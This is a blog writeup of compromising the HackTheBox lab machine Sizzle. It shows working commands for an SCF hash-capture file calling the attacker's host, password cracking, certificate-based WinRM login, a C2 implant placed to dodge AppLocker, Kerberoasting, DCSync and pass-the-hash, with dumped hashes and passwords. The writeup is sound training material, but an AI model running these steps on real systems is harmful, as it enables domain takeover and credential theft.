---
layout: single
title:  "HTB - Sizzle Writeup - 10.10.10.103"
date:   2020-07-20 08:49:23 +0100
categories: hackthebox
excerpt: My walkthrough / writeup of the HTB Active Directory machine Sizzle.
---
![sizzle](/images/sizzle/htb.png)

# HackTheBox - Sizzle - 10.10.10.103

Sizzle is an insane rated Active Directory machine on [hackthebox.eu](https://app.hackthebox.eu).

## Summary
Sizzle is an Insane difficulty Windows Active Directory box. A writable directory in an SMB share allows us to steal NTLM hashes which can be cracked to access the Certificate Services Portal. A self signed certificate can be created using the CA and used for WinRM. A SPN associated with a user allows a kerberoast attack on the box. The user is found to have Replication rights which can be abused to get Administrator hashes via DCSync.

## Recon and Scanning
### Nmap Results
{% highlight bash linenos %}
┌─[root@kali]─[10.10.14.14]─[~/htb/boxes/Sizzle]
└──╼ $nmap -sC -sV -oN nmap/initial 10.10.10.103
Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-20 10:28 BST
Nmap scan report for 10.10.10.103
Host is up (0.038s latency).
Not shown: 987 filtered ports
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           Microsoft ftpd
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|_  SYST: Windows_NT
53/tcp   open  domain?
| fingerprint-strings: 
|   DNSVersionBindReqTCP: 
|     version
|_    bind
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Site doesn't have a title (text/html).
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=sizzle.htb.local
| Not valid before: 2018-07-03T17:58:55
|_Not valid after:  2020-07-02T17:58:55
|_ssl-date: 2020-07-20T09:32:41+00:00; +46s from scanner time.
443/tcp  open  ssl/http      Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Site doesn't have a title (text/html).                                                                                                                                                                                       
| ssl-cert: Subject: commonName=sizzle.htb.local                                                                                                                                                                                           
| Not valid before: 2018-07-03T17:58:55                                                                                                                                                                                                    
|_Not valid after:  2020-07-02T17:58:55                                                                                                                                                                                                    
|_ssl-date: 2020-07-20T09:32:41+00:00; +47s from scanner time.                                                                                                                                                                             
| tls-alpn:                                                                                                                                                                                                                                
|   h2                                                                                                                                                                                                                                     
|_  http/1.1                                                                                                                                                                                                                               
445/tcp  open  microsoft-ds?                                                                                                                                                                                                               
464/tcp  open  kpasswd5?                                                                                                                                                                                                                   
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0                                                                                                                                                                           
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name)                                                                                                                    
| ssl-cert: Subject: commonName=sizzle.htb.local                                                                                                                                                                                           
| Not valid before: 2018-07-03T17:58:55                                                                                                                                                                                                    
|_Not valid after:  2020-07-02T17:58:55                                                                                                                                                                                                    
|_ssl-date: 2020-07-20T09:32:41+00:00; +46s from scanner time.                                                                                                                                                                             
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name)                                                                                                                    
| ssl-cert: Subject: commonName=sizzle.htb.local                                                                                                                                                                                           
| Not valid before: 2018-07-03T17:58:55                                                                                                                                                                                                    
|_Not valid after:  2020-07-02T17:58:55
|_ssl-date: 2020-07-20T09:32:41+00:00; +46s from scanner time.
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=sizzle.htb.local
| Not valid before: 2018-07-03T17:58:55
|_Not valid after:  2020-07-02T17:58:55
|_ssl-date: 2020-07-20T09:32:41+00:00; +47s from scanner time.
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.80%I=7%D=7/20%Time=5F1563DF%P=x86_64-pc-linux-gnu%r(DNSV
SF:ersionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\
SF:x04bind\0\0\x10\0\x03");
Service Info: Host: SIZZLE; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 46s, deviation: 0s, median: 45s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2020-07-20T09:32:02
|_  start_date: 2020-07-20T09:14:16
{% endhighlight %}

Based on the open ports I can deduce that this is a windows domain controller.

### FTP - Anonymous Logon
From the nmap results, it identified that anonymous FTP logins are allowed.
{% highlight bash linenos %}
21/tcp   open  ftp           Microsoft ftpd
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|_  SYST: Windows_NT
{% endhighlight %}
{% highlight bash linenos %}
┌─[root@kali]─[10.10.14.14]─[~/htb/boxes/Sizzle]
└──╼ $ftp 10.10.10.103 
Connected to 10.10.10.103.
220 Microsoft FTP Service
Name (10.10.10.103:root): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> dir
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
ftp> ls
200 PORT command successful.
150 Opening ASCII mode data connection.
226 Transfer complete.
ftp> exit
221 Goodbye.
{% endhighlight %}

Nothing good on FTP.

### SMB Enumeration
![smbenumeration](/images/sizzle/smbenum.png)

Two writeable folders are identified:
{% highlight bash linenos %}
/mnt/users/public
/mnt/ZZ_ARCHIVE
{% endhighlight %}

### AD Cert Authority

![certlm](/images/sizzle/certsrv-login.png)

It appears we need credentials before we can access the certificate authority service.

## Stealing a Users Hash
To steal user hashes we could create a malicious scf file so that when a user opens it we get their hash, which will be captured with responder.

{% highlight bash linenos %}
[Shell]
Command=2
IconFile=\\10.10.14.14\shared\epic.ico
[Taskbar]
Command=ToggleDesktop
{% endhighlight %}

{% highlight bash linenos %}
cp hash.scf /mnt/Users/Public
cp hash.scf /mnt/ZZ_ARCHIVE
responder -I tun0
{% endhighlight %}

![hash](/images/sizzle/amanda-hash.png)

### Cracking the Hash
Firstly, copy the users hash to a file and run john to crack it using `rockyou.txt`

{% highlight bash linenos %}
┌─[root@kali]─[10.10.14.14]─[~/htb/boxes/Sizzle]
└──╼ $john amanda-hash -w=/usr/share/wordlists/rockyou.txt                                                                                                                                                                                 
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Ashare1972       (amanda)
1g 0:00:00:11 DONE (2020-07-20 10:50) 0.08944g/s 1021Kp/s 1021Kc/s 1021KC/s Ashia12..Arsenalx
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed
{% endhighlight %}

We get the credentials, `amanda:Ashare1972`

### Generating a Certificate

Now let's login to the `/certsrv`, AD Certificate Authority, and generate a certificate

{% highlight bash linenos %}
┌─[root@kali]─[10.10.14.14]─[~/htb/boxes/Sizzle]
└──╼ $openssl genrsa -des3 -out amanda.key 2048                                                                                                                                                                                            
Generating RSA private key, 2048 bit long modulus (2 primes)
....................................................+++++
.................................+++++
e is 65537 (0x010001)
Enter pass phrase for amanda.key:
Verifying - Enter pass phrase for amanda.key:
┌─[root@kali]─[10.10.14.14]─[~/htb/boxes/Sizzle]
└──╼ $openssl req -new -key amanda.key -out amanda.csr                                                                                                                                                                                     
Enter pass phrase for amanda.key:
You are about to be asked to enter information that will be incorporated
into your certificate request.
What you are about to enter is what is called a Distinguished Name or a DN.
There are quite a few fields but you can leave some blank
For some fields there will be a default value,
If you enter '.', the field will be left blank.
-----
Country Name (2 letter code) [AU]:
State or Province Name (full name) [Some-State]:
Locality Name (eg, city) []:
Organization Name (eg, company) [Internet Widgits Pty Ltd]:
Organizational Unit Name (eg, section) []:
Common Name (e.g. server FQDN or YOUR name) []:
Email Address []:

{% endhighlight %}

Now let's login and request a certificate:
![certsrv](/images/sizzle/certsrv.png)
![request-cert](/images/sizzle/certgen.png)
![downlaod](/images/sizzle/download-cert.png)

## Login in as Amanda
Now we can use this certificate to login over winrm
{% highlight bash linenos %}
evil-winrm -i 10.10.10.103 -u amanda -c certnew.cer -p Ashare1972 -S -k amanda.key
{% endhighlight %}
{% highlight bash %}
┌─[root@kali]─[10.10.14.14]─[~/htb/boxes/Sizzle]
└──╼ $evil-winrm -i 10.10.10.103 -u amanda -c certnew.cer -p Ashare1972 -S -k amanda.key                                                                                                                                                   
Evil-WinRM shell v2.3

Warning: SSL enabled

Info: Establishing connection to remote endpoint

Enter PEM pass phrase:
*Evil-WinRM* PS C:\Users\amanda\Documents> whoami
htb\amanda
{% endhighlight %}

## Covenant C2 Framework
To get a better overview of the AD Environment we will use [Covenant](https://github.com/cobbr/Covenant), you can install it foolowing the guide [here](https://github.com/cobbr/Covenant/wiki/Installation-And-Startup)

{% highlight bash linenos %}
┌─[root@kali]─[10.10.14.14]─[/opt/Covenant/Covenant]
└──╼ $docker run -it -p 7443:7443 -p 80:80 -p 443:443 --name covenant -v /opt/Covenant/Covenant/Data:/app/Data covenant
{% endhighlight %}

Next, generate a listner and then a binary grunt, finally, host it on your `HTTP Listner` and download it to an `AppLocker Bypass` Directory such as `C:\Windows\System32\spool\drivers\color` and execute it, you shoudl then recieve a grunt back.

![applocker-bypass](/images/sizzle/grunt.png)

### Domain enumeration with Covenant

![c2](/images/sizzle/grunt-1.png)

![c2](/images/sizzle/shell-spn.png)

![c2](/images/sizzle/spn.png)

### Kerberoast
This means that we can kerberoast to get the hash for the user mrlky. Firstly, we need to get a Logon Token using the following command

{% highlight bash linenos %}

[07/20/2020 10:31:33 UTC] MakeToken completed

(admin) > MakeToken amanda htb Ashare1972

Successfully made and impersonated token for user: htb\\amanda

[07/20/2020 10:31:51 UTC] Kerberoast completed

(admin) > Kerberoast mrlky john

$krb5tgs$23$*mrlky$HTB$http/sizzle$4C7FD5EC528445E04815043DD83A48EF$F9D23CCC338FD69D9B4978ACE4A0D276FEF89C0256D6C2C8562472BD434907D77D851F064CE146C10DCE9C5428C9A1C8A9838A01725AFD08F4BD854098FA7D60186CA14B3DA5227CB0F9B002A39B873D98C52BEB5666EC32A21C6086CDF66342C240C20401BC4503A35F741D3A29117978D35B4A5606CFE66B25561D0C7BD76B0397CF17021DAD05D7044EADFAB67621C49DCF9665790EEC2E5C4DB07F655DE5645ED65D72EFADF23B7F6A40094EE2972F629C76961EE48943986E5E532A9A3ED49B53BD6C5131E9414DD138C83ED8845C4E169E4EC08BA4B8FF2804B7B0BECBB657B88441FEFF7F0515F9860D69C1BB2C5D025562B315780A6DEC9A3C07D1701A6EE9C6116EB60529A07B0FC3E23B28C6DDC51FD083E62305FCCB0DFC7BB0D8622978388A7CD07B91650F702A519DF6868C9C73808993531D6B90173B087922B06FA08945B30B911C51C975E2D96C84A669E27A363DA13A13A38901BB165C9BED05E169C6A2C687A4812FFB4A5631CAA751776656E4A9F79D2AB2987A5DF92E5E3049C9B0452F4428DC1575E59B4C9E57FAF8A328E76812A978854E1C9EA65415F6F32BAF872EDD525EEC0D17BA96058E0BC6983EE5058A54CF9E1A2A6BF47E81377A6F1C3B9FC61413D923044DB8D9AB30BCC6E3F8941B0EDAC98472713F69C51676DF220482C66B9BD73DDDAE0103A986406FCFD64E53CFE3AE3BB2A239D69AA57F23249F8D688E89CFFE175BB01EE74EB3448C709024E5EB29738007A31D04E4D0CF152868E457735AB431497FE9575DB788294097E3BF8D4F543F983D21F3490553662B8885CD9FC6BFAA6A9D73E02D144597368E48CEFCB7F3021A566868937C173FADB79AB7BF5EA17651806658EB2605477E2E9FF71FCD6AFF704329625FFABC9F61735C95B601AE87C3FBCF063457E53293027BFED6AB555ADE296F6FCBB6A5972B90F888A54F3D89E8798A374AF069EC53D3B5DCD0097BC95B22136427284457E0A5B2D8936316ED6E2E5DCB8C0CE2934147B0BD888D99F7E32BBC32412D25C616EF04DF72315A2A3E6130ED2067EC24583DBE4817F79C7879B51E5F744A4A84A78E2C6CF42425E60D06C34DC43C376033D04660911D765942F90A94E7AD48A88566AE06F7A8EC88A6BEB1DC6214CED98C89A030AE8510C14D913AA2837EB57E57CCD80578030E812D57FAFFD89ACB08110098B92D777A72A56FC3F1FA0CE3819272EA918DC39A65106CE8DF28E1E25519BBFD4BD8CFF8E25684119252677F095BB831A65B43620CF151196E96C087D53840E39A5A657CE753C42A41DEEA9AD3DB61457D91D2ACC9C005A483AC7B94AD79A3F3C20B16DC08E5B3B3EE21A0AF6F5DAE540280D4F665D74B46E0373633E461C8FB7A01A3FEC8C5646FFF67

{% endhighlight %}

Now we have the hash we can attempt to crack it with john, `john mrlky-tgt -w=/usr/share/wordlists/rockyou.txt`

Bingo, we now have the following credentials, `mrlky:Football#7`

We can now repeat the process of certificate generation, winrm login and loading a grunt with covenant.
{% highlight powershell linenos %}
evil-winrm -i 10.10.10.103 -u mrlky -c mrlky.cer -p Football#7 -S -k mrlky.key
{% endhighlight %}


## Priv Esc from Mrlky
Now that we have a grunt loaded as mrlky, we can continue to enumerate the domain
![grunt-2](/images/sizzle/grunt-2.png)

### PowerView Enumeration
Firstly, we will load up PowerView and find all principals with `Replication Rights`

![pwdl](/images/sizzle/powerview-dlwd.png)

![import](/images/sizzle/import.png)

{% highlight powershell linenos %}
powershell Get-ObjectACL "DC=htb,DC=local" -ResolveGUIDs | ? { ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ObjectAceType -match 'Replication-Get') }
{% endhighlight %}

![import](/images/sizzle/sid.png)

![import](/images/sizzle/sid-1.png)

We can see that mrlky has the right to `Replication Get Changes All` so we can perform a DCSync attack using Covenant to get the Admin hash.

### DCSync 

Considering that we can DCSync, we can use the `DCSync` command from covenant to get the administartors hash

{% highlight bash linenos %}
DCSync administrator htb.local sizzle
{% endhighlight %}

![dcsync](/images/sizzle/dcsync.png)

## Admin Shell - WMIExec
Now we can use wmiexec with the LM and NTLM hashes to get a shell as the admin user

{% highlight powershell linenos %}
wmiexec.py administrator@10.10.10.103 -hashes 336d863559a3f7e69371a85ad959a675:f6b7160bfc91823792e0ac3a162c9267
{% endhighlight %}

![rooted](/images/sizzle/root.gif)

## After Root

Now that we have rooted the box I will use covenant to get a `grunt` as SYSTEM and then dump all of the domain hashes, and clean up the files left over, as I would have done on a real engagement. 

Firstly let's execute the `pwn.exe` to give us a grunt as `SYSTEM`
![system-grunt](/images/sizzle/grunt-3.png)

![system-grunt](/images/sizzle/grunt-4.png)

Now head over to the `Interact Tab` and run 
{% highlight powershell linenos %}
DCSync all htb.local sizzle
{% endhighlight %}

{% highlight powershell  %}
[07/20/2020 13:38:54 UTC] DCSync completed

(admin) > DCSync all htb.local sizzle


  .#####.   mimikatz 2.2.0 (x64) #17763 Apr  9 2019 23:22:27
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz(powershell) # lsadump::dcsync /all /domain:htb.local /dc:sizzle
[DC] 'htb.local' will be the domain
[DC] 'sizzle' will be the DC server
[DC] Exporting domain 'htb.local'

** SAM ACCOUNT **

SAM Username         : sizzler
Object Security ID   : S-1-5-21-2379389067-1826974543-3574127760-1604
Object Relative ID   : 1604

Credentials:
  Hash NTLM: d79f820afad0cbc828d79e16a6f890de

** SAM ACCOUNT **

SAM Username         : SIZZLE$
Object Security ID   : S-1-5-21-2379389067-1826974543-3574127760-1001
Object Relative ID   : 1001

Credentials:
  Hash NTLM: 9cedc1da58bf102a99f0fbb8ae46015c

Object RDN           : Administrator

** SAM ACCOUNT **

SAM Username         : Administrator
Object Security ID   : S-1-5-21-2379389067-1826974543-3574127760-500
Object Relative ID   : 500

Credentials:
  Hash NTLM: f6b7160bfc91823792e0ac3a162c9267

Object RDN           : Guest

** SAM ACCOUNT **

SAM Username         : Guest
Object Security ID   : S-1-5-21-2379389067-1826974543-3574127760-501
Object Relative ID   : 501

Credentials:

Object RDN           : amanda

** SAM ACCOUNT **

SAM Username         : amanda
Object Security ID   : S-1-5-21-2379389067-1826974543-3574127760-1104
Object Relative ID   : 1104

Credentials:
  Hash NTLM: 7d0516ea4b6ed084f3fdf71c47d9beb3

Object RDN           : mrlky

** SAM ACCOUNT **

SAM Username         : mrlky
Object Security ID   : S-1-5-21-2379389067-1826974543-3574127760-1603
Object Relative ID   : 1603

Credentials:
  Hash NTLM: bceef4f6fe9c026d1d8dec8dce48adef

{% endhighlight %}

Now that we have all of the doamin hashes the box is fully complete and we can reset it or remove all files we placed on the box to ensure that the box is clean for anyone else who want's to pwn the box has a fair shot at it.

## User and Root Flags

We can also now get the root and user flags.

{% highlight powershell linenos %}
gc \users\mrlky\desktop\user.txt
gc \users\administrator\desktop\root.txt
{% endhighlight %}

![flags](/images/sizzle/flags.gif)

## Pwned

![pwned](/images/sizzle/pwned.png)

## Respect
If you enjoyed my write up or found it useful consider +repping my htb profile linked below:

[![HTB](http://www.hackthebox.eu/badge/image/210952.png)](https://www.hackthebox.eu/home/users/profile/210952)

